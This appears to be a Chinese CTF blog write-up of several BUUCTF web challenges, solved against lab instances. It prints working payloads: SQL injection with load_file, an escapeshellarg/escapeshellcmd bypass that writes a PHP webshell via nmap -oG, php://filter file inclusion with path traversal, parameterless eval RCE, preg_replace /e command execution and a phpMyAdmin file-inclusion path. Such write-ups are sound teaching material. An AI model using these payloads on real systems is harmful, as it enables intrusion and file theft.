<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;7fc36789-5b09-4d61-8d3f-d65de4cb9049.node4.buuoj.cn:81&#x2F;view.php?no&#x3D;-1 union&#x2F;**&#x2F;select 1,load_file(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;),3,4-1 union&#x2F;**&#x2F;select 1,load_file(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;),3,4</span><br></pre></td></tr></table></figure>



<p>需要注意的是flag在网页代码中</p>
<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>这题目发现有个Hint，里面说</p>
<img src="/2022/11/28/web-BUU%E7%AC%AC%E4%BA%8C%E9%A1%B5/image-20230115145805694.png" alt="image-20230115145805694" style="zoom:67%;">

<p>知道我的IP，那么就想起了XFF头，就是用来看源地址IP的，并且如果是XFF的话那么和模板注入有关</p>
<p>利用XFF头进行测试发现就是XFF的模板注入</p>


<p>直接冲</p>
<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>上来就是一段源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;</span><br><span class="line">    $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#39;host&#39;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $host &#x3D; $_GET[&#39;host&#39;];</span><br><span class="line">    $host &#x3D; escapeshellarg($host);</span><br><span class="line">     &#x2F;&#x2F;escapeshellarg</span><br><span class="line">    &#x2F;&#x2F;1,确保用户值传递一个参数给命令</span><br><span class="line">    &#x2F;&#x2F;2,用户不能指定更多的参数</span><br><span class="line">    &#x2F;&#x2F;3,用户不能执行不同的命令</span><br><span class="line">    $host &#x3D; escapeshellcmd($host);</span><br><span class="line">    &#x2F;&#x2F;escapeshellcmd</span><br><span class="line">    &#x2F;&#x2F;1,确保用户只执行一个命令</span><br><span class="line">    &#x2F;&#x2F;2,用户可以指定不限数量的参数</span><br><span class="line">    &#x2F;&#x2F;3,用户不能执行不同的命令</span><br><span class="line">    $sandbox &#x3D; md5(&quot;glzjin&quot;. $_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">    echo &#39;you are in sandbox &#39;.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现可以利用GET传入一个host，并且执行一个类似扫描的操作，好熟悉，试试管道符,但发现好像不是这个问题</p>
<h3 id="TIPS-1"><a href="#TIPS-1" class="headerlink" title="TIPS"></a>TIPS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg()和escapeshellcmd()</span><br><span class="line"></span><br><span class="line">1.传入的参数是：172.17.0.2&#39; -v -d a&#x3D;1</span><br><span class="line">2.经过escapeshellarg处理后变成了&#39;172.17.0.2&#39;\&#39;&#39; -v -d a&#x3D;1&#39;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</span><br><span class="line">3.经过escapeshellcmd处理后变成&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a&#x3D;1\&#39;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http:&#x2F;&#x2F;php.net&#x2F;manual&#x2F;zh&#x2F;function.escapeshellcmd.php</span><br><span class="line">4.最后执行的命令是curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a&#x3D;1\&#39;，由于中间的\\被解释为\而不再是转义字符，所以后面的&#39;没有被转义，与再后面的&#39;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a&#x3D;1&#39;，即向172.17.0.2\发起请求，POST 数据为a&#x3D;1&#39;。</span><br><span class="line"></span><br><span class="line">漏洞解析</span><br><span class="line">http:&#x2F;&#x2F;www.lmxspace.com&#x2F;2018&#x2F;07&#x2F;16&#x2F;%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98&#x2F;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-oG xxx.php</span><br><span class="line">nmap上传文件的命令</span><br><span class="line">因为单引号被过滤了，我们使用反引号cat &#x2F;flag</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e891d383-ff80-43eb-9c73-ba5276ba3faa.node4.buuoj.cn:81&#x2F;?host&#x3D;&#39; &lt;?php echo &#96;cat &#x2F;flag&#96;;?&gt; -oG test.php &#39;</span><br></pre></td></tr></table></figure>

<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>发现进入页面之后是一个页面，并且根据js代码发现每5秒刷新一次，然后就看不出来什么了，并且buu不能扫目录那么应该不是啥阴间东西吧（robots.txt已经看了）</p>
<p>那就抓包看看</p>


<p>发现包里面两个参数，并且就是报错的内容，翻译下报错内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">警告：date（）：依赖系统的时区设置是不安全的。您需要*使用date.timezone设置或date_default_timezone_set（）函数。如果您使用了这些方法中的任何一种，但仍然收到此警告，则很可能是您拼错了时区标识符。我们现在选择了时区“UTC”，但请设置date.timezone以选择您的时区。在第24行的&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php中</span><br><span class="line"></span><br><span class="line">2023-01-15上午10:02:28</span><br></pre></td></tr></table></figure>

<p>尝试修改一下内容，发现</p>


<p>居然是call_user_func函数，那么第一个func是函数，第二个p是参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">过滤了：system、</span><br><span class="line"></span><br><span class="line">发现file_get_contents没有被过滤，但是不知道flag的位置，找下有没有扫描目录的函数如Scandir，但这个函数需要配合var_dump来使用</span><br></pre></td></tr></table></figure>

<img src="/2022/11/28/web-BUU%E7%AC%AC%E4%BA%8C%E9%A1%B5/image-20230115182112970.png" alt="image-20230115182112970" style="zoom:67%;">

<p>直接使用的话是无法使用的</p>


<p>那还是用file_get_contents看看能不能读源码</p>


<p>发现大部分的函数都被过滤</p>
<p>但即然是Php有出入函数，并且给了源码，那可以试试反序列化</p>
<p>我们首先配置序列化内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   Class Test&#123;</span><br><span class="line">    var $func &#x3D; &#39;system&#39;;</span><br><span class="line">    var $p &#x3D; &#39;find &#x2F; -name *flag*&#39;;</span><br><span class="line"> &#125;</span><br><span class="line">    $o &#x3D; new Test();</span><br><span class="line">    echo (serialize($o))</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>



<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>打开一看啥也没有，目录扫描一下</p>
<p>dirmap</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">github</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;H4ckForJob&#x2F;dirmap</span><br><span class="line">报错缺什么pip install 什么</span><br><span class="line">最后遇到报错</span><br><span class="line">TypeError: start() takes 1 positional argument but 2 were given</span><br><span class="line">参考</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;devil8123665&#x2F;article&#x2F;details&#x2F;109810816</span><br></pre></td></tr></table></figure>

<p>扫描出一个目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;b13f7e4a-a2e3-4768-87df-5cd372385324.node4.buuoj.cn:81&#x2F;.git&#x2F;config</span><br></pre></td></tr></table></figure>

<p>看看下载的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[core]</span><br><span class="line">	repositoryformatversion &#x3D; 0</span><br><span class="line">	filemode &#x3D; true</span><br><span class="line">	bare &#x3D; false</span><br><span class="line">	logallrefupdates &#x3D; true</span><br></pre></td></tr></table></figure>

<p>发现不对劲，想到git泄露</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用GitHack</span><br><span class="line">python GitHack.py http:&#x2F;&#x2F;947decee-cc12-4720-b0da-d968d09246da.node4.buuoj.cn:81&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#39;exp&#39;]))&#123;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;data:\&#x2F;\&#x2F;|filter:\&#x2F;\&#x2F;|php:\&#x2F;\&#x2F;|phar:\&#x2F;\&#x2F;&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">    &#x2F;&#x2F;限制()内不能有内容，无参RCE</span><br><span class="line">        if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z,_]+\((?R)?\)&#x2F;&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">            if (!preg_match(&#39;&#x2F;et|na|info|dec|bin|hex|oct|pi|log&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">                &#x2F;&#x2F; echo $_GET[&#39;exp&#39;];</span><br><span class="line">                @eval($_GET[&#39;exp&#39;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>那么这里发现过滤了可见字符，并且对于参数有限制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">无参数REC 一般有三种绕过姿势：</span><br><span class="line"></span><br><span class="line">gettallheaders（）</span><br><span class="line">get_defined_vars()</span><br><span class="line">session_id()</span><br><span class="line">具体可以参考https:&#x2F;&#x2F;blog.csdn.net&#x2F;Manuffer&#x2F;article&#x2F;details&#x2F;120738755</span><br></pre></td></tr></table></figure>

<p>方法一：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">exp&#x3D;highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">http:&#x2F;&#x2F;66bf547c-b232-4615-96e8-becdcd9b584d.node4.buuoj.cn:81&#x2F;?exp&#x3D;highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line"></span><br><span class="line">highlight_file() 函数对文件进行语法高亮显示，本函数是show_source() 的别名</span><br><span class="line">next() 输出数组中的当前元素和下一个元素的值。</span><br><span class="line">array_reverse() 函数以相反的元素顺序返回数组。(主要是能返回值)</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">pos() 输出数组中的当前元素的值。</span><br><span class="line">localeconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是&quot;.&quot;。</span><br><span class="line"></span><br><span class="line">原理：</span><br><span class="line">loacleconv 函数会固定返回一个 . 然后pos将我们获得的 .返回到我们构造的 payload 使得 scandir能够返回当前目录下的数组（换句话说，就是读出当前目录下的文件） rray_reverse()以相反的顺序输出（目的是以正序输出查询出来的内容）然后 next 提取第二个元素（将.过滤出去），最后用highlight_file()给显示出来。</span><br></pre></td></tr></table></figure>

<p>法二：</p>
<p>无参过滤三种方法中的session_id方法并没有被过滤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">我们可以使用 session_id来获取 flag</span><br><span class="line">session_id() 可以用来获取&#x2F;设置 当前会话 ID。</span><br><span class="line">在我们使用 session_id()的时候 需要使用session_start()来开启session会话</span><br><span class="line">payload</span><br></pre></td></tr></table></figure>



<h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>网页出现两个按钮，选择后发现url中出现参数category，测试一下是不是注入，发现没反应，那么尝试一下文件穿越或者未授权访问</p>


<p>那么好像是可以读取的，换个别的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">即然是Php写的用php的协议试试</span><br><span class="line">http:&#x2F;&#x2F;55f7740f-d223-4a44-91a3-35df70adf54e.node4.buuoj.cn:81&#x2F;index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index</span><br><span class="line"></span><br><span class="line">读取内容</span><br><span class="line">              &lt;?php</span><br><span class="line">				$file &#x3D; $_GET[&#39;category&#39;];</span><br><span class="line"></span><br><span class="line">				if(isset($file))</span><br><span class="line">				&#123;</span><br><span class="line">					if( strpos( $file, &quot;woofers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;meowers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">						include ($file . &#39;.php&#39;);</span><br><span class="line">					&#125;</span><br><span class="line">					else&#123;</span><br><span class="line">						echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				?&gt;</span><br></pre></td></tr></table></figure>

<p>必须得包含关键词才能看到php文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">进行测试</span><br><span class="line">发现当</span><br><span class="line">http:&#x2F;&#x2F;55f7740f-d223-4a44-91a3-35df70adf54e.node4.buuoj.cn:81&#x2F;index.php?category&#x3D;woofers&#x2F;..&#x2F;flag</span><br><span class="line">此时回显内容不同</span><br></pre></td></tr></table></figure>



<p>再次使用php协议试试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;55f7740f-d223-4a44-91a3-35df70adf54e.node4.buuoj.cn:81&#x2F;index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;index&#x2F;resource&#x3D;flag</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;55f7740f-d223-4a44-91a3-35df70adf54e.node4.buuoj.cn:81&#x2F;index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;woofers&#x2F;..&#x2F;resource&#x3D;flag</span><br><span class="line">都可以只需要包含过滤的关键字</span><br></pre></td></tr></table></figure>

<h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p>源码显示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">$text &#x3D; $_GET[&quot;text&quot;];</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;I have a dream&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;&#x2F;h1&gt;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;</span><br><span class="line">        die(&quot;Not now!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    include($file);  &#x2F;&#x2F;next.php</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>那么根据代码的提示，首先我们需要创建一个文件流并且对其内容赋值，然后才可以进行读取并且读取的内容中不包含flag字样，根据提示应该是读取next.php</p>
<p>那么如何写入内容呢</p>
<p>方法一：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I have a dream</span><br></pre></td></tr></table></figure>

<p>方法二：</p>
<p>.php://input</p>
<p><img src="https://img-blog.csdnimg.cn/20210331231901461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JBQkNEWEI=,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>尝试，发现直接读取next.php行不通</p>


<p>尝试利用php协议读取</p>


<p>读取的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">$_SESSION[&#39;id&#39;] &#x3D; $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;,</span><br><span class="line">        &#39;strtolower(&quot;\\1&quot;)&#39;,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($_GET as $re &#x3D;&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line">	@eval($_GET[&#39;cmd&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2557</span><br><span class="line">深入研究preg_replace与代码执行</span><br><span class="line"></span><br><span class="line">在php中，双引号里面如果包含有变量，php解释器会将其替换为变量解释后的结果；单引号中的变量不会被处理。 注意：双引号中的函数不会被执行和替换。</span><br><span class="line"></span><br><span class="line">最后绕过的方法为</span><br><span class="line">?\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(&#39;cat &#x2F;flag&#39;);</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;28be45bc-306b-42d6-8ef0-2f62d4adff91.node4.buuoj.cn:81&#x2F;next.php?\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(&#39;phpinfo()&#39;);</span><br><span class="line"></span><br><span class="line">可以这么理解</span><br><span class="line">return preg_replace(&#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,$str);</span><br><span class="line">三个参数中，我们可以控制一和三，我们输入的内容会经过第一个参数的匹配，如果有配对的内容，就会进行第二个参数的执行可以理解为eval(第二个参数)，第二个参数我们可以将其内容执行理解为\1，那么这个是一个特殊的内容，在php中</span><br><span class="line">反向引用</span><br><span class="line">对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &#39;\n&#39; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</span><br><span class="line">那么此时如果我们输入的第一个参数是对于的调用getFlag函数那么就可以命令执行了，但我们要怎么确保在自己被匹配呢</span><br><span class="line">使用\S*来完成，\S*表示连续匹配多个非空白字符，自然能匹配到传入的参数$&#123;getFlag()&#125;，用以执行命令</span><br></pre></td></tr></table></figure>



<p>方法二：</p>
<p>既然我们都能使用eval了，那为什么不直接命令执行呢</p>
<p>构造Payload,发现直接构造不能成功</p>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*&#x3D;$&#123;system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(102).chr(108).chr(97).chr(103))&#125;</span><br></pre></td></tr></table></figure>

<h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p>查看robots.txt发现一个路由phpinfo.php</p>
<p>无从下手，看了下其他师傅，还得扫目录，存在一个phpmyadmin</p>


<p>发现版本信息，看看有没有现成的漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_43579362&#x2F;article&#x2F;details&#x2F;108476182</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MzIzMTc1MjExOQ&#x3D;&#x3D;&amp;mid&#x3D;2247485036&amp;idx&#x3D;1&amp;sn&#x3D;8e9647906c5d94f72564dec5bc51a2ab&amp;chksm&#x3D;e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare&#x3D;1&amp;scene&#x3D;1&amp;srcid&#x3D;0621gAv1FMtrgoahD01psMZr&amp;pass_ticket&#x3D;LqhRfckPxAVG2dF&#x2F;jxV&#x2F;9&#x2F;cEb5pShRgewJe&#x2F;ttJn2gIlIyGF&#x2F;bsgGmzcbsV%2bLmMK#rd</span><br><span class="line">参考</span><br></pre></td></tr></table></figure>

<p>发现真有两个漏洞，<br><strong><em>\</em>1.任意文件包含**</strong></p>
<p>构造Payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;d824dfeb-36e9-462c-a74c-f749fb7d9d0a.node4.buuoj.cn:81&#x2F;phpmyadmin&#x2F;?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br><span class="line">这个目录需要测试</span><br></pre></td></tr></table></figure>

<p><strong>2.任意代码执行</strong></p>
<p>但需要知道文件路径再包含，条件苛刻</p>
<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>本来看到参数message以为是注入，但发现没反应，用dirseach扫描下，工具更新下，不然buu一直429</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http:&#x2F;&#x2F;34b56be3-014c-4638-a5ab-9bd0473f7a3e.node4.buuoj.cn:81 --timeout&#x3D;2 -t 1 -x 400,403,404,500,503,429</span><br></pre></td></tr></table></figure>

<p>发现了.git那么应该是git泄露</p>
<p>但git泄露后发现一直没有php源码文件，只能先贴别人的</p>
